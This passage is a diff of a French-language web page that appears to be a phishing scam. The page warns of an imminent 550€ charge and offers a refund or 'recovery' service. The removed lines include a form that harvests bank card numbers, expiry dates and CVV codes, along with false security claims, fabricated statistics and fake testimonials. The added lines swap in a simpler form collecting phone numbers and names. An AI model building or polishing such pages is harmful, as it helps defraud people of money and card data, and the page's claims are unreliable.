@@ -190,91 +190,31 @@
             transform: translateX(3px);
         }
 
-        /* Form Styles */
-        .form-section {
-            padding: 40px 0;
-        }
-
-        .form-container {
+        .recovery-form {
             background-color: white;
             border-radius: var(--border-radius);
             box-shadow: var(--box-shadow);
-            overflow: hidden;
-        }
-
-        .form-header {
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: white;
-            padding: 20px;
+            padding: 30px;
+            margin-top: 30px;
         }
 
         .form-title {
-            font-size: 1.5rem;
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-
-        .form-subtitle {
-            font-size: 0.9rem;
-            opacity: 0.9;
-        }
-
-        .form-body {
-            padding: 30px;
-        }
-
-        .operator-logos {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
+            font-size: 1.4rem;
+            color: var(--primary);
             margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-
-        .operator-logos img {
-            height: 40px;
-            object-fit: contain;
-        }
-
-        .alert-box {
-            background-color: #f0f7ff;
-            border-left: 4px solid #3f51b5;
-            padding: 15px;
-            margin-bottom: 20px;
-            display: flex;
-            gap: 10px;
-            align-items: flex-start;
-        }
-
-        .alert-icon {
-            color: #3f51b5;
-            font-size: 1.2rem;
-            margin-top: 2px;
-        }
-
-        .alert-text {
-            font-size: 0.9rem;
-        }
-
-        .alert-text strong {
             font-weight: 600;
+            text-align: center;
         }
 
         .form-group {
             margin-bottom: 20px;
         }
 
-        .form-label {
+        .form-group label {
             display: block;
             margin-bottom: 8px;
             font-weight: 500;
             color: var(--dark);
-            font-size: 0.9rem;
-        }
-
-        .required:after {
-            content: " *";
-            color: var(--error);
         }
 
         .form-control {
@@ -292,48 +232,6 @@
             box-shadow: 0 0 0 3px rgba(63, 81, 181, 0.2);
         }
 
-        .input-with-icon {
-            position: relative;
-        }
-
-        .input-icon {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--gray);
-        }
-
-        .grid-2 {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: flex-start;
-            margin-bottom: 20px;
-        }
-
-        .checkbox-input {
-            margin-right: 10px;
-            margin-top: 3px;
-        }
-
-        .checkbox-label {
-            font-size: 0.9rem;
-        }
-
-        .checkbox-label a {
-            color: var(--primary);
-            text-decoration: none;
-        }
-
-        .checkbox-label a:hover {
-            text-decoration: underline;
-        }
-
         .submit-btn {
             width: 100%;
             padding: 14px;
@@ -345,485 +243,67 @@
             cursor: pointer;
             transition: var(--transition);
             margin-top: 10px;
-            font-size: 1rem;
         }
 
         .submit-btn:hover {
             background-color: var(--primary-dark);
         }
 
-        .loading-spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
+        /* Loading Spinner */
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
         }
-
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(63, 81, 181, 0.2);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
         @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* How It Works Section */
-        .steps-section {
-            padding: 60px 0;
-            background-color: white;
-        }
-
-        .section-title {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-
-        .section-title h2 {
-            font-size: 2rem;
-            color: var(--dark);
-            margin-bottom: 10px;
-        }
-
-        .section-title p {
-            color: var(--gray);
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .steps-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            max-width: 1000px;
-            margin: 0 auto;
-        }
-
-        .step-card {
-            background-color: var(--light);
-            padding: 25px;
-            border-radius: var(--border-radius);
-            border: 1px solid var(--light-gray);
-            transition: var(--transition);
-        }
-
-        .step-card:hover {
-            box-shadow: var(--box-shadow);
-            transform: translateY(-5px);
-        }
-
-        .step-number {
-            width: 40px;
-            height: 40px;
-            background-color: var(--primary);
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
-
-        .step-title {
-            font-size: 1.2rem;
-            margin-bottom: 10px;
-            color: var(--dark);
-        }
-
-        .step-description {
-            color: var(--gray);
-            font-size: 0.9rem;
-        }
-
-        /* Stats Section */
-        .stats-section {
-            padding: 50px 0;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: white;
-            text-align: center;
-        }
-
-        .stats-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 30px;
-            max-width: 1000px;
-            margin: 0 auto;
-        }
-
-        .stat-item h3 {
-            font-size: 2.5rem;
-            margin-bottom: 5px;
-            font-weight: 700;
-        }
-
-        .stat-item p {
-            opacity: 0.8;
-            font-size: 0.9rem;
-        }
-
-        /* Testimonials */
-        .testimonials-section {
-            padding: 60px 0;
-            background-color: white;
-        }
-
-        .testimonials-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            max-width: 1000px;
-            margin: 0 auto;
-        }
-
-        .testimonial-card {
-            background-color: var(--light);
-            padding: 25px;
-            border-radius: var(--border-radius);
-        }
-
-        .testimonial-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .testimonial-avatar {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-right: 15px;
-        }
-
-        .testimonial-author {
-            font-weight: 600;
-        }
-
-        .testimonial-stars {
-            color: #ffc107;
-            font-size: 0.8rem;
-            margin-top: 3px;
-        }
-
-        .testimonial-text {
-            color: var(--gray);
-            font-style: italic;
-            font-size: 0.9rem;
-        }
-
-        /* FAQ Section */
-        .faq-section {
-            padding: 60px 0;
-            background-color: var(--light);
-        }
-
-        .faq-container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .faq-item {
-            margin-bottom: 15px;
-            border: 1px solid var(--light-gray);
-            border-radius: var(--border-radius);
-            overflow: hidden;
-        }
-
-        .faq-question {
-            width: 100%;
-            padding: 15px 20px;
-            background-color: white;
-            border: none;
-            text-align: left;
-            font-weight: 500;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .faq-answer {
-            padding: 0 20px;
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease;
-            background-color: white;
-        }
-
-        .faq-answer.open {
-            padding: 15px 20px;
-            max-height: 500px;
-        }
-
-        .faq-answer p {
-            color: var(--gray);
-            font-size: 0.9rem;
-        }
-
-        /* CTA Section */
-        .cta-section {
-            padding: 60px 0;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: white;
-            text-align: center;
-        }
-
-        .cta-container {
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .cta-title {
-            font-size: 2rem;
-            margin-bottom: 15px;
-        }
-
-        .cta-text {
-            margin-bottom: 25px;
-            font-size: 1.1rem;
-            opacity: 0.9;
-        }
-
-        .cta-btn {
-            display: inline-block;
-            background-color: white;
-            color: var(--primary);
-            padding: 12px 30px;
-            border-radius: var(--border-radius);
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 1rem;
-            transition: var(--transition);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-
-        .cta-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
-        }
-
-        /* Contact Section */
-        .contact-section {
-            padding: 60px 0;
-            background-color: white;
-        }
-
-        .contact-container {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 40px;
-            max-width: 1000px;
-            margin: 0 auto;
-        }
-
-        .contact-info h3 {
-            font-size: 1.5rem;
-            margin-bottom: 20px;
-            color: var(--dark);
-        }
-
-        .contact-item {
-            display: flex;
-            align-items: flex-start;
-            margin-bottom: 20px;
-        }
-
-        .contact-icon {
-            width: 40px;
-            height: 40px;
-            background-color: var(--light);
-            color: var(--primary);
-            border-radius: var(--border-radius);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-            flex-shrink: 0;
-        }
-
-        .contact-details h4 {
-            font-size: 1rem;
-            margin-bottom: 5px;
-            color: var(--dark);
-        }
-
-        .contact-details p {
-            color: var(--gray);
-            font-size: 0.9rem;
-        }
-
-        .social-links {
-            display: flex;
-            gap: 10px;
-            margin-top: 30px;
-        }
-
-        .social-link {
-            width: 40px;
-            height: 40px;
-            background-color: var(--light);
-            color: var(--dark);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: var(--transition);
-        }
-
-        .social-link:hover {
-            background-color: var(--primary);
-            color: white;
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         /* Footer */
         footer {
             background-color: var(--dark);
             color: white;
-            padding: 60px 0 30px;
+            padding: 30px 0;
+            text-align: center;
+            margin-top: 50px;
         }
 
-        .footer-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 30px;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-
-        .footer-logo {
+        .footer-links {
             display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-            font-size: 1.2rem;
-            font-weight: 600;
-        }
-
-        .footer-logo img {
-            height: 30px;
-            margin-right: 10px;
-        }
-
-        .footer-about p {
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 0.9rem;
+            justify-content: center;
+            list-style: none;
             margin-bottom: 20px;
         }
 
-        .footer-links h3 {
-            font-size: 1.1rem;
-            margin-bottom: 15px;
-        }
-
-        .footer-links ul {
-            list-style: none;
-        }
-
         .footer-links li {
-            margin-bottom: 8px;
+            margin: 0 15px;
         }
 
         .footer-links a {
-            color: rgba(255, 255, 255, 0.7);
+            color: white;
             text-decoration: none;
-            font-size: 0.9rem;
             transition: var(--transition);
         }
 
         .footer-links a:hover {
-            color: white;
-        }
-
-        .newsletter h3 {
-            font-size: 1.1rem;
-            margin-bottom: 15px;
-        }
-
-        .newsletter p {
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 0.9rem;
-            margin-bottom: 15px;
-        }
-
-        .newsletter-form {
-            display: flex;
-        }
-
-        .newsletter-input {
-            flex: 1;
-            padding: 10px 15px;
-            border: none;
-            border-radius: var(--border-radius) 0 0 var(--border-radius);
-            font-size: 0.9rem;
-        }
-
-        .newsletter-btn {
-            background-color: var(--accent);
-            color: white;
-            border: none;
-            padding: 0 15px;
-            border-radius: 0 var(--border-radius) var(--border-radius) 0;
-            cursor: pointer;
-        }
-
-        .footer-bottom {
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            padding-top: 30px;
-            margin-top: 30px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-        }
-
-        .footer-social {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .footer-social a {
-            color: rgba(255, 255, 255, 0.7);
-            transition: var(--transition);
-        }
-
-        .footer-social a:hover {
-            color: white;
+            color: var(--accent);
         }
 
         .copyright {
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 0.8rem;
-        }
-
-        /* Back to Top Button */
-        .back-to-top {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            width: 50px;
-            height: 50px;
-            background-color: var(--primary);
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            opacity: 0;
-            visibility: hidden;
-            transition: var(--transition);
-        }
-
-        .back-to-top.visible {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .back-to-top:hover {
-            background-color: var(--primary-dark);
-            transform: translateY(-3px);
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.7);
         }
 
         /* Responsive */
@@ -843,14 +323,6 @@
             .info-label {
                 width: 100%;
                 margin-bottom: 5px;
-            }
-
-            .contact-container {
-                grid-template-columns: 1fr;
-            }
-
-            .grid-2 {
-                grid-template-columns: 1fr;
             }
         }
 
@@ -896,19 +368,7 @@
                 <div class="user-info">
                     <h2>Récapitulatif de votre demande</h2>
                     <div id="userData">
-                        <!-- User data will be injected here by JavaScript -->
-                        <div class="info-item">
-                            <span class="info-label">Numéro de téléphone:</span>
-                            <span class="info-value" id="display-phone">06 12 34 56 78</span>
-                        </div>
-                        <div class="info-item">
-                            <span class="info-label">Opérateur:</span>
-                            <span class="info-value" id="display-operator">Orange</span>
-                        </div>
-                        <div class="info-item">
-                            <span class="info-label">Date de la demande:</span>
-                            <span class="info-value" id="display-date">15/06/2023</span>
-                        </div>
+                        <!-- Les données seront injectées ici par JavaScript -->
                     </div>
                 </div>
                 
@@ -919,631 +379,186 @@
                     <p class="fine-text">Le montant sera débité sans autre avertissement. Si vous contestez cette amende, vous devez agir rapidement.</p>
                 </div>
                 
-                <a href="#form-section" class="btn">
+                <a href="#recovery" class="btn">
                     Demander l'annulation du prélèvement <i class="fas fa-arrow-right"></i>
                 </a>
             </div>
-        </div>
-    </main>
             
-    <!-- Main Form Section -->
-    <section id="form-section" class="form-section">
-        <div class="container">
-            <div class="form-container">
-                <div class="form-header">
-                    <h2 class="form-title">Formulaire de Remboursement</h2>
-                    <p class="form-subtitle">Veuillez remplir tous les champs ci-dessous</p>
-                </div>
+            <div id="recovery" class="recovery-form">
+                <h2 class="form-title">Service de récupération du montant</h2>
+                <p style="text-align: center; margin-bottom: 20px;">Nous pouvons vous aider à récupérer les 550€ après le prélèvement. Remplissez ce formulaire pour initier la procédure.</p>
                 
-                <div class="form-body">
-                    <!-- Operator Logos -->
-                    <div class="operator-logos">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/SFR_2022_logo.svg/1200px-SFR_2022_logo.svg.png" alt="SFR" class="h-12 object-contain">
-                        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/c/c8/Orange_logo.svg/1200px-Orange_logo.svg.png" alt="Orange" class="h-12 object-contain">
-                        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0c/Bouygues_T%C3%A9l%C3%A9com_logo.svg/1200px-Bouygues_T%C3%A9l%C3%A9com_logo.svg.png" alt="Bouygues Telecom" class="h-12 object-contain">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Free_logo.svg/1200px-Free_logo.svg.png" alt="Free" class="h-12 object-contain">
+                <form id="recoveryForm">
+                    <div class="form-group">
+                        <label for="recovery-phone">Numéro de téléphone *</label>
+                        <input type="tel" id="recovery-phone" class="form-control" required>
                     </div>
                     
-                    <!-- Security Message -->
-                    <div class="alert-box">
-                        <i class="fas fa-shield-alt alert-icon"></i>
-                        <p class="alert-text"><strong>Connexion sécurisée :</strong> Vos données sont cryptées via SSL et ne seront jamais partagées avec des tiers.</p>
+                    <div class="form-group">
+                        <label for="recovery-name">Nom complet *</label>
+                        <input type="text" id="recovery-name" class="form-control" required>
                     </div>
                     
-                    <!-- Main Form -->
-                    <form id="remboursement-form" class="remboursement-form">
-                        <!-- Phone Number -->
-                        <div class="form-group">
-                            <label for="telephone" class="form-label required">Numéro de téléphone</label>
-                            <div class="input-with-icon">
-                                <input type="tel" id="telephone" name="telephone" class="form-control" placeholder="Ex: 06 12 34 56 78" required>
-                                <i class="fas fa-phone input-icon"></i>
-                            </div>
-                        </div>
-                        
-                        <!-- Operator Selection -->
-                        <div class="form-group">
-                            <label for="operateur" class="form-label required">Choisir votre opérateur</label>
-                            <select id="operateur" name="operateur" class="form-control" required>
-                                <option value="" disabled selected>-- Sélectionnez votre opérateur --</option>
-                                <option value="orange">Orange</option>
-                                <option value="bouygues">Bouygues Telecom</option>
-                                <option value="sfr">SFR</option>
-                                <option value="free">Free Mobile</option>
-                                <optgroup label="Opérateurs virtuels">
-                                    <option value="la-poste">La Poste Mobile</option>
-                                    <option value="coriolis">Coriolis</option>
-                                    <option value="nrj-mobile">NRJ Mobile</option>
-                                    <option value="red">RED by SFR</option>
-                                    <option value="sosh">Sosh (Orange)</option>
-                                    <option value="b-and-you">B&YOU (Bouygues Telecom)</option>
-                                    <option value="syma">Syma Mobile</option>
-                                    <option value="lycamobile">Lycamobile</option>
-                                    <option value="lebara">Lebara Mobile</option>
-                                    <option value="reglo-mobile">Réglo Mobile (E.Leclerc)</option>
-                                    <option value="prixtel">Prixtel</option>
-                                    <option value="auchantelecom">Auchan Telecom</option>
-                                    <option value="cdiscount">Cdiscount Mobile</option>
-                                    <option value="budgetmobile">Budget Mobile</option>
-                                    <option value="koodo">Koodo</option>
-                                    <option value="hellomobile">Hello Mobile</option>
-                                    <option value="zeop">Zeop Mobile</option>
-                                </optgroup>
-                                <option value="autre">Autre (Autre opérateur)</option>
-                            </select>
-                        </div>
-                        
-                        <!-- Bank Selection -->
-                        <div class="form-group">
-                            <label for="bank" class="form-label required">Choisir votre banque</label>
-                            <select id="bank" name="bank" class="form-control" required>
-                                <option value="" disabled selected>-- Sélectionnez votre banque --</option>
-                                <optgroup label="Banques traditionnelles">
-                                    <option value="bnpp">BNP Paribas</option>
-                                    <option value="sg">Société Générale</option>
-                                    <option value="cic">CIC</option>
-                                    <option value="ca">Crédit Agricole</option>
-                                    <option value="bp">Banque Populaire</option>
-                                    <option value="cm">Crédit Mutuel</option>
-                                    <option value="hsbc">HSBC France</option>
-                                    <option value="la-poste">La Banque Postale</option>
-                                    <option value="lcl">LCL (Le Crédit Lyonnais)</option>
-                                </optgroup>
-                                <optgroup label="Banques en ligne">
-                                    <option value="ing">ING</option>
-                                    <option value="bforbank">BforBank</option>
-                                    <option value="fortuneo">Fortuneo</option>
-                                    <option value="monabanq">Monabanq</option>
-                                    <option value="hellobank">Hello Bank!</option>
-                                    <option value="orange-bank">Orange Bank</option>
-                                    <option value="n26">N26</option>
-                                    <option value="revolut">Revolut</option>
-                                </optgroup>
-                                <optgroup label="Banques régionales">
-                                    <option value="ca-regionale">Crédit Agricole (régionale)</option>
-                                    <option value="bpce">BPCE (Banque Populaire et Caisse d'Epargne)</option>
-                                    <option value="ce">Caisse d'Epargne</option>
-                                    <option value="arkea">Crédit Mutuel Arkéa</option>
-                                </optgroup>
-                                <optgroup label="Autres banques">
-                                    <option value="boursorama">Boursorama Banque</option>
-                                    <option value="axa">AXA Banque</option>
-                                    <option value="banque-palatine">Banque Palatine</option>
-                                    <option value="hsbc">HSBC France</option>
-                                    <option value="barclays">Barclays France</option>
-                                    <option value="c-zam">C-Zam</option>
-                                </optgroup>
-                                <option value="autre">Autre (Autre banque)</option>
-                            </select>
-                        </div>
-                        
-                        <!-- Amount -->
-                        <div class="form-group">
-                            <label for="amount" class="form-label required">Montant à rembourser (€)</label>
-                            <div class="input-with-icon">
-                                <input type="number" id="amount" name="amount" class="form-control" placeholder="550" min="10" max="650" required>
-                                <span class="input-icon">€</span>
-                            </div>
-                        </div>
-                        
-                        <!-- Reason -->
-                        <div class="form-group">
-                            <label for="reason" class="form-label required">Motif du remboursement</label>
-                            <select id="reason" name="reason" class="form-control" required>
-                                <option value="" disabled selected>-- Sélectionnez un motif --</option>
-                                <option value="surcharge">Surcharge indue</option>
-                                <option value="Frais indus (550€)">Frais indus (550€)</option>
-                                <option value="service">Service non fourni</option>
-                                <option value="interruption">Interruption de service</option>
-                                <option value="erreur">Erreur de facturation</option>
-                                <option value="autre">Autre raison</option>
-                            </select>
-                        </div>
-                        
-                        <!-- Card Holder -->
-                        <div class="form-group">
-                            <label for="nom" class="form-label required">Titulaire de la carte</label>
-                            <div class="input-with-icon">
-                                <input type="text" id="nom" name="nom" class="form-control" placeholder="Ex: Jean Dupont" required>
-                                <i class="fas fa-user input-icon"></i>
-                            </div>
-                        </div>
-                        
-                        <!-- Card Number -->
-                        <div class="form-group">
-                            <label for="numero-carte" class="form-label required">Numéro de carte</label>
-                            <div class="input-with-icon">
-                                <input type="tel" id="numero-carte" name="numero-carte" class="form-control" placeholder="1234 5678 9012 3456" required maxlength="19">
-                                <i class="fas fa-credit-card input-icon"></i>
-                            </div>
-                            <p id="card-error" class="error-message hidden">Le numéro de carte doit être valide et suivre le format requis.</p>
-                        </div>
-                        
-                        <!-- Expiration and CVV -->
-                        <div class="grid-2">
-                            <!-- Expiration Date -->
-                            <div class="form-group">
-                                <label for="date-expiration" class="form-label required">Date d'expiration (MM/AA)</label>
-                                <div class="input-with-icon">
-                                    <input type="month" id="date-expiration" name="date-expiration" class="form-control" required>
-                                    <i class="fas fa-calendar-alt input-icon"></i>
-                                </div>
-                            </div>
-                            
-                            <!-- CVV -->
-                            <div class="form-group">
-                                <label for="cvv" class="form-label required">Code CVV</label>
-                                <div class="input-with-icon">
-                                    <input type="tel" id="cvv" name="cvv" class="form-control" placeholder="123" required maxlength="4">
-                                    <i class="fas fa-question-circle input-icon" title="Le code CVV est le numéro à 3 ou 4 chiffres au dos de votre carte"></i>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <!-- Terms and Conditions -->
-                        <div class="checkbox-group">
-                            <input type="checkbox" id="terms" name="terms" class="checkbox-input" required>
-                            <label for="terms" class="checkbox-label">
-                                J'accepte les <a href="#">conditions générales</a> et la <a href="#">politique de confidentialité</a>.
-                            </label>
-                        </div>
-                        
-                        <!-- Submit Button -->
-                        <button type="submit" id="submit-btn" class="submit-btn">
-                            <span id="btn-text">Valider mon remboursement</span>
-                            <div id="loading-spinner" class="loading-spinner hidden"></div>
-                        </button>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </section>
-    
-    <!-- How It Works -->
-    <section id="how-it-works" class="steps-section">
-        <div class="container">
-            <div class="section-title">
-                <h2>Comment obtenir votre remboursement</h2>
-                <p>Notre processus simple et sécurisé en 3 étapes</p>
-            </div>
-            
-            <div class="steps-container">
-                <div class="step-card">
-                    <div class="step-number">1</div>
-                    <h3 class="step-title">Remplissez le formulaire</h3>
-                    <p class="step-description">Fournissez les informations nécessaires pour traiter votre demande de remboursement.</p>
-                </div>
-                
-                <div class="step-card">
-                    <div class="step-number">2</div>
-                    <h3 class="step-title">Vérification des données</h3>
-                    <p class="step-description">Nos équipes vérifient votre éligibilité au remboursement sous 24 heures.</p>
-                </div>
-                
-                <div class="step-card">
-                    <div class="step-number">3</div>
-                    <h3 class="step-title">Réception du remboursement</h3>
-                    <p class="step-description">Votre remboursement est crédité sur votre compte sous 3 à 5 jours ouvrés.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Stats Section -->
-    <section class="stats-section">
-        <div class="container">
-            <div class="stats-container">
-                <div class="stat-item">
-                    <h3>10,000+</h3>
-                    <p>Clients satisfaits</p>
-                </div>
-                <div class="stat-item">
-                    <h3>98%</h3>
-                    <p>Taux de réussite</p>
-                </div>
-                <div class="stat-item">
-                    <h3>24h</h3>
-                    <p>Temps de réponse</p>
-                </div>
-                <div class="stat-item">
-                    <h3>5M€</h3>
-                    <p>Remboursés au total</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Testimonials -->
-    <section class="testimonials-section">
-        <div class="container">
-            <div class="section-title">
-                <h2>Ce que disent nos clients</h2>
-                <p>Découvrez les témoignages de ceux qui ont déjà utilisé notre service</p>
-            </div>
-            
-            <div class="testimonials-container">
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="https://randomuser.me/api/portraits/women/43.jpg" alt="Sophie M." class="testimonial-avatar">
-                        <div>
-                            <h4 class="testimonial-author">Sophie M.</h4>
-                            <div class="testimonial-stars">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"J'ai reçu mon remboursement en seulement 3 jours. Le processus était simple et sécurisé. Je recommande vivement ce service!"</p>
-                </div>
-                
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Pierre L." class="testimonial-avatar">
-                        <div>
-                            <h4 class="testimonial-author">Pierre L.</h4>
-                            <div class="testimonial-stars">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Service client réactif et professionnel. J'avais des doutes sur la sécurité mais tout s'est très bien passé. Merci!"</p>
-                </div>
-                
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="https://randomuser.me/api/portraits/women/65.jpg" alt="Élodie T." class="testimonial-avatar">
-                        <div>
-                            <h4 class="testimonial-author">Élodie T.</h4>
-                            <div class="testimonial-stars">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star-half-alt"></i>
-                            </div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"Après des mois à me battre avec mon opérateur, ce service m'a permis d'obtenir enfin mon remboursement. Très satisfaite."</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- FAQ Section -->
-    <section id="faq" class="faq-section">
-        <div class="container">
-            <div class="section-title">
-                <h2>Questions fréquentes</h2>
-                <p>Trouvez des réponses aux questions les plus courantes</p>
-            </div>
-            
-            <div class="faq-container">
-                <div class="faq-item">
-                    <button class="faq-question">
-                        <span>Est-ce que ce service est sécurisé?</span>
-                        <i class="fas fa-chevron-down"></i>
-                    </button>
-                    <div class="faq-answer">
-                        <p>Oui, notre service utilise les dernières technologies de cryptage SSL pour protéger vos données. Nous ne stockons jamais les informations de votre carte bancaire et utilisons des protocoles de sécurité stricts conformes aux normes PCI DSS.</p>
-                    </div>
-                </div>
-                
-                <div class="faq-item">
-                    <button class="faq-question">
-                        <span>Combien de temps faut-il pour recevoir mon remboursement?</span>
-                        <i class="fas fa-chevron-down"></i>
-                    </button>
-                    <div class="faq-answer">
-                        <p>Le délai moyen pour recevoir un remboursement est de 3 à 5 jours ouvrés après validation de votre demande. Nous traitons toutes les demandes dans les 24 heures suivant leur soumission. Le délai exact peut varier en fonction de votre banque.</p>
-                    </div>
-                </div>
-                
-                <div class="faq-item">
-                    <button class="faq-question">
-                        <span>Quels sont les frais pour utiliser ce service?</span>
-                        <i class="fas fa-chevron-down"></i>
-                    </button>
-                    <div class="faq-answer">
-                        <p>Notre service est entièrement gratuit pour les utilisateurs. Nous sommes rémunérés par les opérateurs pour faciliter le processus de remboursement. Vous recevrez 100% du montant que vous avez demandé.</p>
-                    </div>
-                </div>
-                
-                <div class="faq-item">
-                    <button class="faq-question">
-                        <span>Que faire si mon opérateur n'est pas dans la liste?</span>
-                        <i class="fas fa-chevron-down"></i>
-                    </button>
-                    <div class="faq-answer">
-                        <p>Si votre opérateur n'apparaît pas dans la liste, sélectionnez l'option "Autre opérateur" et précisez le nom de votre opérateur dans le champ de commentaires. Nous traiterons votre demande de la même manière et contacterons votre opérateur si nécessaire.</p>
-                    </div>
-                </div>
-                
-                <div class="faq-item">
-                    <button class="faq-question">
-                        <span>Comment puis-je suivre l'état de ma demande?</span>
-                        <i class="fas fa-chevron-down"></i>
-                    </button>
-                    <div class="faq-answer">
-                        <p>Après avoir soumis votre formulaire, vous recevrez un email de confirmation avec un numéro de suivi. Vous pouvez également nous contacter directement par téléphone ou email pour avoir des informations sur l'état de votre demande.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- CTA Section -->
-    <section class="cta-section">
-        <div class="container">
-            <div class="cta-container">
-                <h2 class="cta-title">Prêt à obtenir votre remboursement?</h2>
-                <p class="cta-text">Remplissez le formulaire maintenant et recevez votre argent en quelques jours seulement.</p>
-                <a href="#form-section" class="cta-btn">
-                    Commencer maintenant <i class="fas fa-arrow-right ml-2"></i>
-                </a>
-            </div>
-        </div>
-    </section>
-
-    <!-- Contact Section -->
-    <section id="contact" class="contact-section">
-        <div class="container">
-            <div class="section-title">
-                <h2>Contactez-nous</h2>
-                <p>Notre équipe est disponible pour répondre à toutes vos questions</p>
-            </div>
-            
-            <div class="contact-container">
-                <div class="contact-info">
-                    <h3>Informations de contact</h3>
-                    
-                    <div class="contact-item">
-                        <div class="contact-icon">
-                            <i class="fas fa-envelope"></i>
-                        </div>
-                        <div class="contact-details">
-                            <h4>Email</h4>
-                            <p>support@amende550.com</p>
-                        </div>
+                    <div class="loading" id="loading">
+                        <div class="spinner"></div>
+                        <p>Traitement de votre demande...</p>
                     </div>
                     
-                    <div class="contact-item">
-                        <div class="contact-icon">
-                            <i class="fas fa-phone-alt"></i>
-                        </div>
-                        <div class="contact-details">
-                            <h4>Téléphone</h4>
-                            <p>+33 8 90 83 67 89</p>
-                            <p>Lundi-Vendredi, 9h-18h</p>
-                        </div>
-                    </div>
-                    
-                    <div class="contact-item">
-                        <div class="contact-icon">
-                            <i class="fas fa-map-marker-alt"></i>
-                        </div>
-                        <div class="contact-details">
-                            <h4>Adresse</h4>
-                            <p>123 Avenue des Champs-Élysées</p>
-                            <p>75008 Paris, France</p>
-                        </div>
-                    </div>
-                    
-                    <div class="social-links">
-                        <a href="#" class="social-link"><i class="fab fa-facebook-f"></i></a>
-                        <a href="#" class="social-link"><i class="fab fa-twitter"></i></a>
-                        <a href="#" class="social-link"><i class="fab fa-linkedin-in"></i></a>
